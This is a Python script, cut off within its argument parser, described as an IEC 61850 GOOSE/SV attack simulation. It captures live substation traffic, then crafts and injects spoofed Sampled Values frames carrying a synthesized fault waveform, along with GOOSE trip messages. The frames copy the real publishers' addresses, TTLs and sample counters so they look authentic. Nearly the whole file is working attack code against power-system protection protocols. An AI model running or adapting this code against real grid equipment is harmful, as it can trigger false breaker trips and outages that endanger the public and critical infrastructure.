import pyshark
from pyshark.packet.fields import LayerField
import random
import time
import json
import sys
from datetime import datetime
from scapy.all import Ether, sendp
import struct
from collections import defaultdict
import argparse
import threading


# ── Global GOOSE tracking ─────────────────────────────────────────
time_diff        = []
src_mac          = None
dst_mac          = None
appid            = "0x0000"
c_stNum          = 0
c_sqNum          = 0
c_state          = None   # None = unknown until first GOOSE seen.
                          # True  = boolean 'true'  (no trip) → normal bucket
                          # False = boolean 'false' (trip)    → tripped bucket
c_ttl            = 500    # timeAllowedToLive (ms) from the captured GOOSE; the
                          # crafter reuses it so injected TTLs match the publisher.
                          # 500 is only the fallback until the first GOOSE is seen.
last_packet_time = None

# ── SV inter-arrival timing (mirrors time_diff for the SV stream) ──
sv_time_diff        = []     # ms between consecutive SV packets
last_sv_packet_time = None   # epoch seconds of the previous SV packet

# ── Global SV state ───────────────────────────────────────────────
neutral_phases = []
svID           = None
confRev        = None
smpCnt         = None
smpSynch       = None
sv_src_mac     = None
sv_dst_mac     = None
sv_appid       = "0x0000"   # SV stream APPID (distinct from the GOOSE appid)
max_vol        = [0, 0, 0]
max_cur        = [0, 0, 0]

# Per-publisher ASDU identity, keyed sv1..svN. Captured live so the crafter can
# re-emit every publisher with its own svID/confRev/smpSynch/neutral and an
# independently advancing smpCnt.
sv_meta = {}   # dict[str -> {svID, confRev, smpSynch, smpcnt_base, neutral}]

# Every smpCnt value seen for each bus, keyed sv1..svN. The crafter takes the
# MAX per bus as that bus's starting smpCnt, then increments per sample.
sv_smpcnt_seen = defaultdict(list)   # dict[str -> list[int]]

# Constant added to EVERY bus's smpCnt base before the per-sample increment.
# Bump this (e.g. set to 2) to nudge the whole SV stream's smpCnt forward.
SV_SMPCNT_OFFSET = 0

# ── Bucketed SV sample stores ─────────────────────────────────────
seqdatas_normal  = defaultdict(list)   # SV captured while GOOSE boolean = true  (no trip)
seqdatas_tripped = defaultdict(list)   # SV captured while GOOSE boolean = false (trip)

MIN_SV_ENTRIES = 10   # minimum per-bucket before analysis

# smpCnt advances every sample and wraps once per nominal second; for 50 Hz at
# 80 samples/cycle that is 4000. Set this to the target publisher's
# (sample-rate x nominal-frequency) so injected counters look authentic.
SV_SMPCNT_WRAP = 4000

# Fallback inter-packet intervals (ms) when none were captured (e.g. FILE mode
# without explicit interval metadata). SV is fast (4000 samples/s => 0.25ms);
# GOOSE steady-state retransmission is on the order of a second.
DEFAULT_SV_INTERVAL_MS    = 0.25
DEFAULT_GOOSE_INTERVAL_MS = 1000.0

# ── Fault synthesis (Option B) ────────────────────────────────────
# A synthesized trip scales the NORMAL baseline (no captured fault needed). The
# trip walks a full protection arc whose phase DURATIONS are set in SV samples
# (packets), so the operator controls exactly how long each state lasts. Ordered
# to match sv_range.pcapng — the breaker-open state precedes the fault:
#   healthy lead-in → breaker OPENS (I ~ FAULT_OPEN_CURRENT, V swelled to
#   FAULT_SWELL) → OPEN/de-energized hold → recloses into the FAULT (I up to
#   FAULT_SURGE, V sagged to FAULT_SAG) → sustained fault → clears + settle.
# Magnitude defaults are calibrated to sv_range.pcapng (surge ~6.3x, sag ~0.22,
# swell ~1.07, open current ~0).
FAULT_SURGE           = 6.3
FAULT_SAG             = 0.22
FAULT_SWELL           = 1.07
FAULT_OPEN_CURRENT    = 0.0    # current as a fraction of nominal while breaker open
FAULT_LEAD_SAMPLES    = 2      # healthy samples before anything happens
FAULT_TRIP_SAMPLES    = 2      # breaker-open transition: I -> ~0, V -> swell
FAULT_OPEN_SAMPLES    = 12     # open / de-energized hold: I ~0, V swelled
FAULT_ONSET_SAMPLES   = 3      # ramp from open into the fault: I -> surge, V -> sag
FAULT_HOLD_SAMPLES    = 12     # sustained fault: current ceiling, voltage sag
FAULT_RECLOSE_SAMPLES = 4      # fault clears + settle back to nominal
FAULT_SETTLE          = True   # if False, stay in the fault instead of recovering to normal


import re

seqData_pattern = re.compile(r'^(?:[0-9A-Fa-f]{2}:){31}[0-9A-Fa-f]{2}$')



# ─────────────────────────────────────────────────────────────────
#  Interval helpers
# ─────────────────────────────────────────────────────────────────

def processIntervals(time_diff):
    if not time_diff:
        return 0, 0
    average      = sum(time_diff) / len(time_diff)
    biggest_diff = max(time_diff) - average
    return biggest_diff, average


def parse_goose_time(time_container):
    time_str = str(time_container).replace(" UTC", "").strip()
    time_str = " ".join(time_str.split())
    if '.' in time_str:
        base_time, fractional = time_str.split('.')
        microseconds = fractional[:6].ljust(6, '0')
        cleaned = f"{base_time}.{microseconds}"
    else:
        cleaned = f"{time_str}.000000"
    return datetime.strptime(cleaned, "%b %d, %Y %H:%M:%S.%f")


# ─────────────────────────────────────────────────────────────────
#  BER encoder
# ─────────────────────────────────────────────────────────────────

def _to_int(v, default=0):
    """Coerce a pyshark field show (e.g. '2807', 'none (0)') to an int."""
    try:
        return int(v)
    except (ValueError, TypeError):
        m = re.search(r'-?\d+', str(v))
        if m:
            return int(m.group())
        return default


def _list_get(items, index, fallback):
    """Return items[index] when the index is in range, else fallback.

    Like dict.get, but for a list looked up by position. Used to read the
    per-ASDU field lists (one entry per bus) without an out-of-range error
    when a field happens to be missing for some bus.
    """
    if index < len(items):
        return items[index]
    return fallback


def _bus_number(key):
    """Numeric part of a bus key: 'sv14' -> 14. Used for numeric sorting."""
    return int(key[2:])


# The trip flag arrives in wildly different shapes: a real bool (FILE mode), an
# int, or a pyshark show string ('True', 'false', '1', '0', 'none (0)',
# '1 (true)'). Equality checks (== 0 / == 1) silently fail on the string forms,
# so funnel every source through this one normalizer instead.
_TRUE_TOKENS  = {'true', 't', '1', 'yes', 'on'}
_FALSE_TOKENS = {'false', 'f', '0', 'no', 'off', 'none', ''}

def _as_bool(v):
    """Normalize any bool/int/str boolean representation to a real bool."""
    if isinstance(v, bool):
        return v
    if isinstance(v, (int, float)):
        return v != 0
    s = str(v).strip().lower()
    if s in _TRUE_TOKENS:
        return True
    if s in _FALSE_TOKENS:
        return False
    # Mixed forms like 'none (0)' or '1 (true)': trust the embedded number.
    m = re.search(r'-?\d+', s)
    if m:
        return int(m.group()) != 0
    return bool(s)


def build_ber(tag, value):
    # bool MUST be checked before int (bool is a subclass of int in Python)
    if isinstance(value, bool):
        val_bytes = b"\xff" if value else b"\x00"

    elif isinstance(value, str):
        val_bytes = value.encode('utf-8')

    elif isinstance(value, int):
        if value == 0:
            val_bytes = b"\x00"
        else:
            num_bytes = (value.bit_length() + 8) // 8
            val_bytes = value.to_bytes(num_bytes, byteorder='big', signed=True)

    elif isinstance(value, float):
        val_bytes = struct.pack('>f', value)

    elif isinstance(value, (list, bytes, bytearray)):
        val_bytes = bytes(value)

    else:
        val_bytes = str(value).encode('utf-8')

    v_len = len(val_bytes)
    if v_len <= 127:
        len_bytes = bytes([v_len])
    else:
        num_len_bytes = (v_len.bit_length() + 7) // 8
        len_bytes = (bytes([0x80 | num_len_bytes])
                     + v_len.to_bytes(num_len_bytes, byteorder='big'))

    if isinstance(tag, int):
        tag_bytes = bytes([tag])
    else:
        tag_bytes = bytes(tag)
    return tag_bytes + len_bytes + val_bytes


# ─────────────────────────────────────────────────────────────────
#  FILE mode: seed-file parser
# ─────────────────────────────────────────────────────────────────

REQUIRED_META_KEYS = [
    "src_mac", "dst_mac", "appid",
    "sv_src_mac", "sv_dst_mac",
    "svID", "confRev", "smpCnt", "smpSynch",
    "c_stNum", "c_sqNum", "c_state",
    "neutral_phases",
]



# ─────────────────────────────────────────────────────────────────
#  LIVE mode: packet processors
# ─────────────────────────────────────────────────────────────────

def process_goose_packet(pkt, busN):
    global time_diff, last_packet_time, src_mac, dst_mac, appid
    global c_stNum, c_sqNum, c_state, c_ttl

    try:
        if 'GOOSE' not in pkt and 'goose' not in pkt:
            return

        goose            = pkt.goose
        expected_gocbref = f'simpleIOGenericIO/LLN0$GO$gcbAnalogValues{busN}'

        if expected_gocbref == str(goose.gocbref):
            src_mac = pkt.eth.src
            dst_mac = pkt.eth.dst
            appid   = goose.appid
            c_stNum = int(goose.stnum)
            c_sqNum = int(goose.sqnum)

            # Reuse the publisher's own timeAllowedToLive so injected packets
            # don't stand out with a hardcoded TTL. Keep the last value on any
            # parse miss (Wireshark field: goose.timeAllowedtoLive).
            c_ttl = _to_int(getattr(goose, 'timeallowedtolive', c_ttl), c_ttl)

            # The trip flag is a boolean inside the GOOSE dataset. Read the decoded
            # boolean field directly when the dissector exposes it (reliable);
            # str(goose.alldata) is a container node and never contains the literal
            # "true"/"false" text, so only fall back to scanning it as a last resort.
            # Normalize to a real bool at the source so no str/int ever leaks
            # downstream. c_state == True means boolean 'true' == NO trip.
            bool_field = getattr(goose, 'boolean', None)
            if bool_field is not None:
                c_state = _as_bool(bool_field)
            else:
                c_state = "true" in str(goose.alldata).lower()

            current_datetime = parse_goose_time(goose.t)

            if last_packet_time is not None:
                delta_ms = (current_datetime - last_packet_time).total_seconds() * 1000
                time_diff.append(delta_ms)

            last_packet_time = current_datetime

    except AttributeError as e:
        print(f"[GOOSE][AttributeError] {e}")
    except Exception as e:
        print(f"[GOOSE][Error] {e}")


def process_sv_packet(pkt, bus_number):
    global svID, confRev, smpCnt, smpSynch
    global sv_src_mac, sv_dst_mac, sv_appid, neutral_phases
    global seqdatas_normal, seqdatas_tripped, c_state
    global sv_time_diff, last_sv_packet_time, sv_meta, sv_smpcnt_seen
    try:
        if 'SV' not in pkt and 'sv' not in pkt:
            return

        sv         = pkt.sv
        sv_src_mac = pkt.eth.src
        sv_dst_mac = pkt.eth.dst
        sv_appid   = getattr(sv, 'appid', appid)   # fall back to GOOSE appid if absent
        svID       = sv.svid
        confRev    = sv.confrev
        smpCnt     = sv.smpcnt
        smpSynch   = sv.smpsynch

        # Record the inter-arrival time so the replay can pace the SV stream
        # relative to the real publisher (see processIntervals / --speedup).
        try:
            ts = float(pkt.sniff_timestamp)
            if last_sv_packet_time is not None:
                sv_time_diff.append((ts - last_sv_packet_time) * 1000.0)
            last_sv_packet_time = ts
        except (AttributeError, ValueError):
            pass
        pub1_hex = None     # pub 1: bare-hex field, no sv.seqData name
        rest_hex = []       # pub 2..N: sv.seqData LayerFields, in dissector order
        for field in sv._get_all_fields_with_alternates():
            if isinstance(field, LayerField) and field.name == 'sv.seqData':
                rest_hex.append(field.show)
            elif seqData_pattern.fullmatch(str(field)):
                if pub1_hex is None:
                    pub1_hex = str(field)
                # Extra bare-hex matches are unexpected; ignore them rather than
                # let them push every subsequent publisher into the wrong bucket.

        # Fixed (bucket_key, hex) pairs: pub 1 is always sv1; pub 2..N follow as
        # sv2, sv3, … If pub 1 is absent on a packet, sv1 is simply skipped that
        # round instead of being back-filled with pub 2's sample.
        seqdata_items = []
        if pub1_hex is not None:
            seqdata_items.append(("sv1", pub1_hex))
        for j, hexstr in enumerate(rest_hex):
            seqdata_items.append((f"sv{j + 2}", hexstr))

        if not seqdata_items:
            return

        # Every ASDU carries its OWN svID/smpCnt/confRev/smpSynch. Pull each as a
        # list — one entry per ASDU, in bus order (index 0 == bus 1) — so bus i
        # keeps its own smpCnt instead of a single shared scalar. These are
        # indexed by the SAME position as seqdata_items, so a bus's counter can
        # never land on another bus.
        def _all_shows(field_name):
            try:
                container = getattr(sv, field_name)
            except AttributeError:
                return []
            fields = getattr(container, 'all_fields', None)
            if not fields:
                fields = [container]
            shows = []
            for field in fields:
                if hasattr(field, 'show'):
                    shows.append(field.show)
                else:
                    shows.append(str(field))
            return shows

        all_svids     = _all_shows('svid')
        all_smpcnts   = _all_shows('smpcnt')
        all_confrevs  = _all_shows('confrev')
        all_smpsynchs = _all_shows('smpsynch')
        for i, (sv_key, value) in enumerate(seqdata_items):
            f_value = bytes.fromhex(value.replace(':', ''))
            # Split the raw ASDU into consecutive 4-byte big-endian float32 fields.
            sv_values = []
            for b in range(0, len(f_value), 4):
                if b + 4 <= len(f_value):
                    one_float = struct.unpack('>f', f_value[b:b+4])[0]
                    sv_values.append(str(one_float))

            if len(sv_values) == 8:
                sv_list     = sv_values[0:6]              # Ia, Ib, Ic, Va, Vb, Vc
                bus_neutral = [sv_values[6], sv_values[7]]  # In, Vn (this bus's own)
            else:
                print(f"[SV][WARN] {sv_key} has {len(sv_values)} values "
                      f"(expected 8) — skipping.")
                continue
            # Route by the last-known GOOSE state. c_state stays None until the
            # first matching GOOSE packet sets it, so pre-GOOSE SV frames (SV is
            # ~4000/s vs GOOSE ~1/s, so many arrive first) aren't misfiled.
            # boolean true == no trip == normal; boolean false == trip == tripped.
            if c_state is None:
                pass                                       # state unknown yet — skip bucketing
            elif _as_bool(c_state):
                seqdatas_normal[sv_key].append(sv_list)    # true  → no trip
            else:
                seqdatas_tripped[sv_key].append(sv_list)   # false → trip

            this_smpcnt = _to_int(_list_get(all_smpcnts, i, smpCnt))
            sv_smpcnt_seen[sv_key].append(this_smpcnt)

            # This bus's own identity, indexed by the same position as its seqData.
            # When a field list is shorter than the ASDU list (missing for this
            # bus), fall back to the last shared scalar or a sane default.
            sv_meta[sv_key] = {
                'svID':        _list_get(all_svids, i, svID or sv_key),
                'confRev':     _list_get(all_confrevs, i, confRev or 1),
                'smpSynch':    _list_get(all_smpsynchs, i, smpSynch or 0),
                'smpcnt_base': max(sv_smpcnt_seen[sv_key]),
                'neutral':     bus_neutral,
            }
            neutral_phases = bus_neutral

        n_count = len(seqdatas_normal.get(f"sv{bus_number}", []))
        t_count = len(seqdatas_tripped.get(f"sv{bus_number}", []))


    except Exception as e:
        print(f"[SV][Error] {e}")


# ─────────────────────────────────────────────────────────────────
#  Analysis
# ─────────────────────────────────────────────────────────────────

def sv_value_analysis(dataset, target_key="sv1", label=""):
    """
    Compute consecutive-sample diffs and rolling peak values from *dataset*.

    dataset    : dict mapping bus key -> list of [Ia, Ib, Ic, Va, Vb, Vc] rows
    target_key : which publisher to analyse (the bus being attacked)
    label      : string used only for debug output ("normal" or "tripped")
    """
    global max_vol, max_cur

    vol_diff, cur_diff = [], []
    target_sv_list     = dataset.get(target_key, [])

    if len(target_sv_list) < 2:
        print(f"[-] Not enough SV data ({len(target_sv_list)} entries). Need at least 2.")
        return vol_diff, cur_diff, []

    for i, row in enumerate(target_sv_list):
        # abs() ensures negative AC half-cycles still update the peak correctly
        max_cur[0] = max(abs(float(row[0])), max_cur[0])
        max_cur[1] = max(abs(float(row[1])), max_cur[1])
        max_cur[2] = max(abs(float(row[2])), max_cur[2])
        max_vol[0] = max(abs(float(row[3])), max_vol[0])
        max_vol[1] = max(abs(float(row[4])), max_vol[1])
        max_vol[2] = max(abs(float(row[5])), max_vol[2])

        if i > 0:
            prev = target_sv_list[i - 1]
            cur_diff.extend([
                float(row[0]) - float(prev[0]),
                float(row[1]) - float(prev[1]),
                float(row[2]) - float(prev[2]),
            ])
            vol_diff.extend([
                float(row[3]) - float(prev[3]),
                float(row[4]) - float(prev[4]),
                float(row[5]) - float(prev[5]),
            ])

    last_sv_value = [float(v) for v in target_sv_list[-1][:6]]
    print(f"[analysis:{label}] cur_diff len={len(cur_diff)}  "
          f"vol_diff len={len(vol_diff)}")
    print(f"[analysis:{label}] max_cur={max_cur}  max_vol={max_vol}")
    print(f"[analysis:{label}] last_sv={last_sv_value}")
    return vol_diff, cur_diff, last_sv_value


# ─────────────────────────────────────────────────────────────────
#  Value generation
# ─────────────────────────────────────────────────────────────────

def fault_profile(smp_index):
    """Return (cur_mult, vol_mult) for sample smp_index of the trip arc.

    Phases run back-to-back in fixed SV-sample counts (not fractions), so each
    state lasts exactly as long as its *_SAMPLES setting. Ordered to match
    sv_range.pcapng: the breaker OPENS before the fault, not after.

      1. healthy lead-in     FAULT_LEAD_SAMPLES     (1.0, 1.0)
      2. breaker opens       FAULT_TRIP_SAMPLES     1->OPEN,  1->SWELL
      3. open / de-energized FAULT_OPEN_SAMPLES     (OPEN, SWELL) I~0, V swelled
      4. recloses into fault FAULT_ONSET_SAMPLES    OPEN->SURGE, SWELL->SAG
      5. sustained fault     FAULT_HOLD_SAMPLES     (SURGE, SAG)  I ceiling, V sag
      6. clears + settle     FAULT_RECLOSE_SAMPLES  SURGE->1,     SAG->1

    Both current regimes are reproduced: current DOWN to ~FAULT_OPEN_CURRENT while
    the breaker is open, then UP to the ceiling during the fault. Multipliers
    scale the recorded NORMAL baseline. Any samples past phase 6 stay at nominal.
    """
    surge, sag, swell, openc = (FAULT_SURGE, FAULT_SAG,
                                FAULT_SWELL, FAULT_OPEN_CURRENT)
    open_ramp, onset, settle = (FAULT_TRIP_SAMPLES, FAULT_ONSET_SAMPLES,
                                FAULT_RECLOSE_SAMPLES)

    e1 = FAULT_LEAD_SAMPLES
    e2 = e1 + open_ramp
    e3 = e2 + FAULT_OPEN_SAMPLES
    e4 = e3 + onset
    e5 = e4 + FAULT_HOLD_SAMPLES
    e6 = e5 + settle

    i = smp_index
    if i < e1:                                    # healthy lead-in
        return 1.0, 1.0, None
    if i < e2:                                     # breaker opens: I -> ~0, V -> swell
        k = (i - e1 + 1) / max(1, open_ramp)
        return 1.0 + (openc - 1.0) * k, 1.0 + (swell - 1.0) * k, None
    if i < e3:                                     # open / de-energized hold
        return openc, swell, 1
    if i < e4:                                     # recloses into fault: I -> surge, V -> sag
        k = (i - e3 + 1) / max(1, onset)
        return openc + (surge - openc) * k, swell + (sag - swell) * k, None
    if i < e5:                                     # sustained fault
        return surge, sag, None
    if not FAULT_SETTLE:                           # hold the fault; never recover
        return surge, sag, None
    if i < e6:                                     # fault clears + settle to nominal
        k = (i - e5 + 1) / max(1, settle)
        return surge + (1.0 - surge) * k, sag + (1.0 - sag) * k, None
    return 1.0, 1.0, None                                # settled (window longer than arc)


def gen_sv_values(last_value, vol, cur, trip, smp_index=0, recorded_rows=None):
    global max_cur, max_vol

    def _pick(pool):
        return float(random.choice(pool)) if pool else 0.0

    # Anchor every sample to an actual recorded NORMAL row (cycled by smp_index)
    # plus a bounded diff as jitter. Anchoring to a recorded sample — not to the
    # previously crafted output — stops the additive walk from compounding.
    base = recorded_rows[smp_index % len(recorded_rows)] if recorded_rows else last_value
    deEnergize = None
    if not trip:
        cur_mult = vol_mult = 1.0
    else:
        # Option B: synthesize the fault from the normal baseline. Current surges,
        # voltage sags then recovers with a brief swell — see fault_profile().
        cur_mult, vol_mult, deEnergize = fault_profile(smp_index)

    # Scale the current jitter by the current multiplier (capped at 1.0) so the
    # noise tapers to 0 as the breaker opens. This lets the current settle to
    # exactly 0 during the open-packets phase (cur_mult -> FAULT_OPEN_CURRENT ~ 0)
    # instead of floating on residual jitter, while leaving normal (mult=1) and
    # fault-surge (mult>1) jitter magnitudes unchanged.
    cur_jit = min(1.0, cur_mult)
    if deEnergize:
        cur_1 = float(base[0]) * cur_mult
        cur_2 = float(base[1]) * cur_mult
        cur_3 = float(base[2]) * cur_mult
        vol_1 = float(base[3]) * vol_mult + _pick(vol)
        vol_2 = float(base[4]) * vol_mult + _pick(vol)
        vol_3 = float(base[5]) * vol_mult + _pick(vol)
    else:
        cur_1 = float(base[0]) * cur_mult + _pick(cur) * cur_jit
        cur_2 = float(base[1]) * cur_mult + _pick(cur) * cur_jit
        cur_3 = float(base[2]) * cur_mult + _pick(cur) * cur_jit
        vol_1 = float(base[3]) * vol_mult + _pick(vol)
        vol_2 = float(base[4]) * vol_mult + _pick(vol)
        vol_3 = float(base[5]) * vol_mult + _pick(vol)
    # Floor voltages at 0: these channels are treated as magnitudes, so a
    # negative sample (base * sag + a large negative jitter) is unphysical.
    vol_1 = max(0.0, vol_1)
    vol_2 = max(0.0, vol_2)
    vol_3 = max(0.0, vol_3)


    # Clamp to a physical ceiling. During a fault the ceiling is the nominal peak
    # scaled by the surge (current) or swell (voltage) so the synthesized surge is
    # not capped back into the normal operating range.
    cur_scale = FAULT_SURGE if trip else 1.0
    vol_scale = FAULT_SWELL if trip else 1.0

    def _clamp(value, peak, scale):
        peak = peak * scale
        if peak <= 0:
            return value
        return max(-peak, min(value, peak))

    cur_1 = _clamp(cur_1, max_cur[0], cur_scale)
    cur_2 = _clamp(cur_2, max_cur[1], cur_scale)
    cur_3 = _clamp(cur_3, max_cur[2], cur_scale)
    vol_1 = _clamp(vol_1, max_vol[0], vol_scale)
    vol_2 = _clamp(vol_2, max_vol[1], vol_scale)
    vol_3 = _clamp(vol_3, max_vol[2], vol_scale)

    print(f"[gen_sv] → cur=({cur_1:.3f}, {cur_2:.3f}, {cur_3:.3f})  "
          f"vol=({vol_1:.3f}, {vol_2:.3f}, {vol_3:.3f})")
    return cur_1, cur_2, cur_3, vol_1, vol_2, vol_3


# ─────────────────────────────────────────────────────────────────
#  Packet crafters
# ─────────────────────────────────────────────────────────────────

def craft_sv(target_key, vol, cur, last_sv, trip, replay_rows,
             smp_index=0, recorded_rows=None):
    """
    Build ONE SV frame carrying every captured publisher as its own ASDU, in bus
    order (sv1, sv2, … svN). The target bus is crafted (attack values); every
    other bus replays its own recorded sample verbatim. Each ASDU uses its OWN
    svID / smpCnt / confRev / smpSynch from sv_meta — no field is shared between
    buses, so nothing gets mixed    up.
    """
    global sv_src_mac, sv_dst_mac, sv_appid, sv_meta

    keys          = sorted(sv_meta.keys(), key=_bus_number)
    asdu_blobs    = []
    latest_target = last_sv

    for key in keys:
        meta    = sv_meta[key]
        neutral = meta.get('neutral', ['0.0', '0.0'])

        if key == target_key:
            cur_1, cur_2, cur_3, vol_1, vol_2, vol_3 = gen_sv_values(
                last_sv, vol, cur, trip,
                smp_index=smp_index, recorded_rows=recorded_rows)
            # Wire order MUST mirror the decode order in process_sv_packet:
            #   [Ia, Ib, Ic, Va, Vb, Vc, In, Vn]
            eight         = [cur_1, cur_2, cur_3, vol_1, vol_2, vol_3,
                             neutral[0], neutral[1]]
            latest_target = [cur_1, cur_2, cur_3, vol_1, vol_2, vol_3]
        else:
            rows = replay_rows.get(key) or []
            if not rows:
                continue   # nothing captured for this bus; drop its ASDU
            row   = rows[smp_index % len(rows)]      # 6 recorded phase values
            eight = [row[0], row[1], row[2], row[3], row[4], row[5],
                     neutral[0], neutral[1]]

        raw_sv = b"".join(struct.pack('>f', float(v)) for v in eight)


        this_smpcnt = (_to_int(meta['smpcnt_base']) + SV_SMPCNT_OFFSET + smp_index) & 0xFFFF
        smpCnt_ber  = bytes([0x82, 0x02]) + this_smpcnt.to_bytes(2, 'big')

        confRev_ber = bytes([0x83, 0x04]) + (_to_int(meta['confRev'], 1) & 0xFFFFFFFF).to_bytes(4, 'big')

        asdu_body = (
            build_ber(0x80, meta['svID'])
            + smpCnt_ber
            + confRev_ber
            + build_ber(0x85, _to_int(meta['smpSynch'], 0))
            + build_ber(0x87, raw_sv)
        )
        asdu_blobs.append(build_ber(0x30, asdu_body))

    seq_asdu_container = build_ber(0xA2, b"".join(asdu_blobs))
    no_asdu_ber        = build_ber(0x80, len(asdu_blobs))
    sv_apdu            = build_ber(0x60, no_asdu_ber + seq_asdu_container)

    base_int     = 16 if 'x' in str(sv_appid).lower() else 10
    appid_bytes  = int(str(sv_appid), base_int).to_bytes(2, byteorder='big')
    length_bytes = (8 + len(sv_apdu)).to_bytes(2, byteorder='big')

    sv_payload      = appid_bytes + length_bytes + b"\x08\x00\x00\x00" + sv_apdu
    complete_packet = Ether(dst=sv_dst_mac, src=sv_src_mac, type=0x88ba) / sv_payload

    if len(complete_packet) < 60:
        complete_packet = complete_packet / (b"\x00" * (60 - len(complete_packet)))

    return complete_packet, latest_target


def resync_smpcnt(elapsed_s, sv_interval_ms):
    """Advance every bus's smpCnt base to cover time spent paused at the replay
    gate.

    The real publisher keeps emitting SV samples while the operator waits at the
    prompt, so the smpCnt baseline captured earlier goes stale by
    (elapsed / sample_period) samples. Bump each bus forward by that many counts
    (mod the per-second wrap) so injected smpCnt resumes where the live stream
    now is instead of lagging behind by however long we paused.

    sv_interval_ms is the measured mean SV inter-packet spacing; its reciprocal
    is the sample rate. Falls back to SV_SMPCNT_WRAP samples/s if unknown.
    """
    if elapsed_s <= 0 or not sv_meta:
        return
    rate    = (1000.0 / sv_interval_ms) if sv_interval_ms > 0 else float(SV_SMPCNT_WRAP)
    advance = int(round(elapsed_s * rate))
    if advance <= 0:
        return
    for meta in sv_meta.values():
        base = _to_int(meta.get('smpcnt_base', 0))
        meta['smpcnt_base'] = (base + advance) % SV_SMPCNT_WRAP
    print(f"[main] Resync: paused {elapsed_s:.1f}s → advanced smpCnt by "
          f"{advance} (mod {SV_SMPCNT_WRAP}) across {len(sv_meta)} bus(es).")


def craft_goose(busN, trip, sqNum_increment=1):
    global src_mac, dst_mac, appid, c_stNum, c_sqNum, c_state, c_ttl

    if not src_mac or not dst_mac:
        print("[-] craft_goose: no baseline MAC captured yet.")
        return None

    if trip:
        goose_boolean = build_ber(0x83, False)
    else:
        goose_boolean = build_ber(0x83, True)


    # Assert the *intended* state, not whatever was last captured.
    all_data_payload = build_ber(0xAB, goose_boolean)

    gocbRef           = build_ber(0x80, f"simpleIOGenericIO/LLN0$GO$gcbAnalogValues{busN}")
    timeAllowedToLive = build_ber(0x81, _to_int(c_ttl, 500))
    datSet            = build_ber(0x82, f"simpleIOGenericIO/LLN0$AnalogValues{busN}")
    goID              = build_ber(0x83, f"simpleIOGenericIO/LLN0$GO$gcbAnalogValues{busN}")

    # IEC 61850 UTCTime (the GOOSE 't' field) is exactly 8 binary octets, NOT a
    # printable date string:
    #   bytes 0-3 : seconds since 1970-01-01 UTC          (uint32, big-endian)
    #   bytes 4-6 : fraction of a second, frac * 2**24     (24-bit,  big-endian)
    #   byte  7   : TimeQuality flags (low 5 bits = accuracy). 0x0a matches the
    #               captured publisher: clock in sync, 10-bit accuracy.
    ns_since_epoch = time.time_ns()
    seconds        = ns_since_epoch // 1_000_000_000
    frac_ns        = ns_since_epoch % 1_000_000_000
    fraction       = (frac_ns << 24) // 1_000_000_000      # nanoseconds -> 24-bit fraction
    time_quality   = 0x0a

    utctime_bytes = (
        (seconds  & 0xFFFFFFFF).to_bytes(4, 'big')
        + (fraction & 0xFFFFFF).to_bytes(3, 'big')
        + bytes([time_quality])
    )

    pkt_time = build_ber(0x84, utctime_bytes)   # -> 84 08 <8 octets>

    # A trip is a state change: bump stNum once and restart sqNum at 0, then
    # let sqNum climb on each retransmission. Replicating steady-state traffic
    # keeps stNum and simply continues the sqNum sequence.
    if trip:
        this_stNum = int(c_stNum) + 2
        this_sqNum = sqNum_increment - 1
    else:
        this_stNum = int(c_stNum)
        this_sqNum = int(c_sqNum) + sqNum_increment

    stNum            = build_ber(0x85, this_stNum)
    sqNum            = build_ber(0x86, this_sqNum)
    test             = build_ber(0x87, True)
    confRev_field    = build_ber(0x88, 1)
    ndsCom           = build_ber(0x89, False)   # captured value: ndsCom = False
    numDatSetEntries = build_ber(0x8A, 1)

    goose_pdu_content = (gocbRef + timeAllowedToLive + datSet + goID +
                         pkt_time + stNum + sqNum + test +
                         confRev_field + ndsCom + numDatSetEntries +
                         all_data_payload)

    ber_encoded   = build_ber(0x61, goose_pdu_content)
    header_length = 8 + len(ber_encoded)

    base_int    = 16 if 'x' in str(appid).lower() else 10
    appid_bytes = int(str(appid), base_int).to_bytes(2, byteorder='big')

    pkt = (Ether(dst=dst_mac, src=src_mac, type=0x88b8)
           / appid_bytes
           / header_length.to_bytes(2, 'big')
           / b"\x00\x00\x00\x00"
           / ber_encoded)

    return pkt


# ─────────────────────────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────────────────────────

def parse_arguments():
    parser = argparse.ArgumentParser(
        description=(
            "IEC 61850 GOOSE/SV attack simulation.\n\n"
            "LIVE mode  : sniff traffic, collect normal+tripped SV baselines,\n"
            "             then inject crafted packets.\n"
            "FILE mode  : load a JSON seed file (--file) and skip live capture.\n\n"
            "Seed-file format: see module docstring or README."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    parser.add_argument(
        '-b', '--bus',
        type=int,
        required=True,
        help="Target bus number (integer)."
    )
    parser.add_argument(
        '--trip',
        action='store_true',
        help="Inject packets that simulate a trip condition."
    )
    parser.add_argument(
        '-i', '--interface',
        type=str,
        default='eth0',
        help="Network interface for sniffing and injection. (default: eth0)"
    )
    parser.add_argument(
        '-n', '--packets',
        type=int,
        default=10,
        help="Number of attack packets to transmit. (default: 10)"
    )
    parser.add_argument(
        '--file',
        type=str,
        default=None,
        metavar='SEED_FILE',
        help=(
            "Path to a JSON seed file containing pre-recorded SV baselines and "
            "GOOSE metadata. When provided, live capture is skipped entirely. "
            "See the module docstring for the required file format."
        )
    )
    parser.add_argument(
        '--min-sv',
        type=int,
        default=MIN_SV_ENTRIES,
        metavar='N',
        help=(
            "Minimum SV samples required in *each* bucket (normal and tripped) "
            "before live capture stops. Ignored in file mode. (default: 10)"
        )
    )
    parser.add_argument(
        '--speedup',
        type=float,
        default=0.30,
        metavar='FRAC',
        help=(
            "Shorten the captured inter-packet interval by this fraction for "
            "both the SV and GOOSE replay. 0.30 => 70%% of the captured spacing "
            "(i.e. 30%% faster). 0 replays at the captured rate. (default: 0.30)"
        )
    )
    parser.add_argument(
        '--auto-start',
        action='store_true',
        help=(
            "Skip the manual 'press ENTER to replay' prompt and start the "
            "injection immediately once the baseline is collected. Use for "
            "unattended runs. (default: prompt and wait)"
        )
    )
    parser.add_argument(
        '--ied-delay',
        type=float,
        default=None,
        metavar='MS',
        help=(
            "Fixed milliseconds to wait after the SV stream starts before the "
            "GOOSE stream begins. Omit for AUTO (default): the GOOSE trip is "
            "released the instant the SV stream reaches its first abnormal "
            "sample, so more --normal-packets automatically pushes the trip "
            "later (and fewer pulls it earlier), with real send time accounted "
            "for. Passing a number restores a fixed pre-roll delay."
        )
    )
    # ── Fault magnitudes (how extreme each abnormal state is) ─────────
    parser.add_argument(
        '--fault-current',
        type=float,
        default=FAULT_SURGE,
        metavar='X',
        help=(
